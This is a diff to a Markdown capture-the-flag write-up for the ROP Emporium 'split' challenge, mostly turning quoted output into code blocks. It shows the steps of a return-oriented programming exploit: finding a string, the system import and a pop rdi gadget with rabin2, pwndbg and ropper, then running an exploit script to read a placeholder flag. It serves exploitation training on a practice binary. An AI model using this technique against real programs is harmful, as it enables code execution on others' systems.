@@ -10,129 +10,103 @@ More information in the linked website.
 ## How to build the ROP chain
 
 Download the challenge:
-```
-curl --output split.zip https://ropemporium.com/binary/split.zip
-unzip split.zip && rm split.zip
+```sh
+$ curl --output split.zip https://ropemporium.com/binary/split.zip
+$ unzip split.zip && rm split.zip
 ```
 
 Since the string is contained in the executable, let's start using ```rabin2``` to locate it:
-```
-rabin2 -z split
+```sh
+$ rabin2 -z split
 ``` 
 
->[Strings]
->
->nth paddr      vaddr      len size section type  string
->
->―――――――――――――――――――――――――――――――――――――――――――――――――――――――
->
->0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
->
->1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
->
->2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
->
->3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
->
->4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
->
->5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
->
->0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
+```asm
+[Strings]
+
+nth paddr      vaddr      len size section type  string
+
+―――――――――――――――――――――――――――――――――――――――――――――――――――――――
+
+0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
+1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
+2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
+3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
+4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
+5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
+0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
+```
 
 The string is in ```0x00601060```. 
 We also know that ```system``` is located somewhere, so check the imported functions from shared libraries:
-```
-rabin2 -i split
+```sh
+$ rabin2 -i split
 ```
 
->[Imports]
->
->nth vaddr      bind   type   lib name
->
->―――――――――――――――――――――――――――――――――――――
->
->1   0x00400550 GLOBAL FUNC       puts
->
->2   0x00400560 GLOBAL FUNC       system
->
->3   0x00400570 GLOBAL FUNC       printf
->
->4   0x00400580 GLOBAL FUNC       memset
->
->5   0x00400590 GLOBAL FUNC       read
->
->6   0x00000000 GLOBAL FUNC       __libc_start_main
->
->7   0x00000000 WEAK   NOTYPE     __gmon_start__
->
->8   0x004005a0 GLOBAL FUNC       setvbuf
+```asm
+[Imports]
 
+nth vaddr      bind   type   lib name
+
+―――――――――――――――――――――――――――――――――――――
+
+1   0x00400550 GLOBAL FUNC       puts
+2   0x00400560 GLOBAL FUNC       system
+3   0x00400570 GLOBAL FUNC       printf
+4   0x00400580 GLOBAL FUNC       memset
+5   0x00400590 GLOBAL FUNC       read
+6   0x00000000 GLOBAL FUNC       __libc_start_main
+7   0x00000000 WEAK   NOTYPE     __gmon_start__
+8   0x004005a0 GLOBAL FUNC       setvbuf
+```
 
 Ok, ```system``` is imported, but what register should we set in order to store the parameter e.g. ```/bin/cat flag.txt```?
 Listing the function written by the programmer could be a start...:
 
-```
-rabin2 -qs split | grep -ve imp -e ' 0 '
+```sh
+$ rabin2 -qs split | grep -ve imp -e ' 0 '
 ```
 
->0x00601078 8 stdout
->
->x00601080 1 completed.7698
->
->0x004006e8 90 pwnme
->
->0x00400742 17 usefulFunction
->
->0x004007d0 2 __libc_csu_fini
->
->0x00601078 8 stdout@@GLIBC_2.2.5
->
->0x004007e0 4 _IO_stdin_used
->
->0x00601060 18 usefulString
->
->0x00400760 101 __libc_csu_init
->
->0x004005e0 2 _dl_relocate_static_pie
->
->0x004005b0 43 _start
->
->0x00400697 81 main
+```asm
+0x00601078 8 stdout
+0x00601080 1 completed.7698
+0x004006e8 90 pwnme
+0x00400742 17 usefulFunction
+0x004007d0 2 __libc_csu_fini
+0x00601078 8 stdout@@GLIBC_2.2.5
+0x004007e0 4 _IO_stdin_used
+0x00601060 18 usefulString
+0x00400760 101 __libc_csu_init
+0x004005e0 2 _dl_relocate_static_pie
+0x004005b0 43 _start
+0x00400697 81 main
+```
 
 Great! Then disassemble ```usefulFunction```:
-
->pwndbg> disass usefulFunction
->
->Dump of assembler code for function usefulFunction:
->
->   0x0000000000400742 <+0>:     push   rbp
->
->   0x0000000000400743 <+1>:     mov    rbp,rsp
->
->   0x0000000000400746 <+4>:     mov    edi,0x40084a
->
->   0x000000000040074b <+9>:     call   0x400560 <system@plt>
->
->   0x0000000000400750 <+14>:    nop
->
->   0x0000000000400751 <+15>:    pop    rbp
->
->   0x0000000000400752 <+16>:    ret    
->
->End of assembler dump.
-
+```asm
+pwndbg> disass usefulFunction
+Dump of assembler code for function usefulFunction:
+  0x0000000000400742 <+0>:     push   rbp
+  0x0000000000400743 <+1>:     mov    rbp,rsp
+  0x0000000000400746 <+4>:     mov    edi,0x40084a
+  0x000000000040074b <+9>:     call   0x400560 <system@plt>
+  0x0000000000400750 <+14>:    nop
+  0x0000000000400751 <+15>:    pop    rbp
+  0x0000000000400752 <+16>:    ret    
+End of assembler dump.
+```
 As we can see, the edi register is used to store the string, to verify that:
 
-```
+```asm
 pwndbg> x/s 0x40084a
 ```
 
->0x40084a:       "/bin/ls"
+```asm
+0x40084a:       "/bin/ls"
+```
 
 Enter to pwndbg (```gdb-pwndbg split```) and disassemble ```pwnme```:
 
-```
+```asm
 pwndbg> disass pwnme
 Dump of assembler code for function pwnme:
    0x00000000004006e8 <+0>:     push   rbp
@@ -165,11 +139,12 @@ As we can see there's a ```rax,[rbp-0x20]``` instruction before the read operati
 
 What remains to do is finding a gadget that pops a value from the stack and puts it into the edi register.
 
+```sh
+$ ropper -f split
 ```
-ropper -f split
+```asm
+0x00000000004007c3: pop rdi; ret; 
 ```
-
->0x00000000004007c3: pop rdi; ret; 
 
 Done.
 Now we can build the rop chain. At the ret instruction at the end of ```pwnme``` the stack should be like:  
@@ -235,20 +210,14 @@ p.sendline(payload)
 p.interactive()
 ```
 
-```
-python3 exploit.py
-```
+```sh
+$ python3 exploit.py
 
->[+] Starting local process './split': pid 101757
->
->[*] running in new terminal: ['/usr/bin/gdb', '-q', './split', '101757', '-x', '/tmp/pwnywkpk4ct.gdb']
->
->[+] Waiting for debugger: Done
->
->[*] Switching to interactive mode
->
-> Thank you!
->
->ROPE{a_placeholder_32byte_flag!}
->
->$  
+[+] Starting local process './split': pid 101757
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './split', '101757', '-x', '/tmp/pwnywkpk4ct.gdb']
+[+] Waiting for debugger: Done
+[*] Switching to interactive mode
+ Thank you!
+ROPE{a_placeholder_32byte_flag!}
+$
+```  
